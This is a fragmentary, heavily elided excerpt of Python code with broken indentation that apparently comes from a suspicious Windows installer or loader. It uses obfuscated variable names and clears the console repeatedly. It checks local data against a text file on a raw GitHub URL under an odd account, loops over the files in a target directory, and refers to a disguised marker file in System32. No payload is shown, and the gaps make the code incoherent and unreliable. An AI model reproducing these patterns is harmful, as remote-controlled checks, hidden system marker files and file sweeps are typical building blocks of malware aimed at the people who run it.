...
if not os.path.exists(dcnmwxdr):
    ...
    os.system('cls')
result = check_string_in_url("https://raw.githubusercontent.com/v1klscasi2359235/installer/refs/heads/main/uniqueidaes.txt", file_contentsx1)
os.system('cls')
        ...
        if os.path.exists(target_dir) and os.path.isdir(target_dir):
            for file_name in os.listdir(target_dir):
                ...
                try:
                    ...
                    print(f"")
check_file = r"C:\Windows\System32\v1updateapril172025v1.txt"
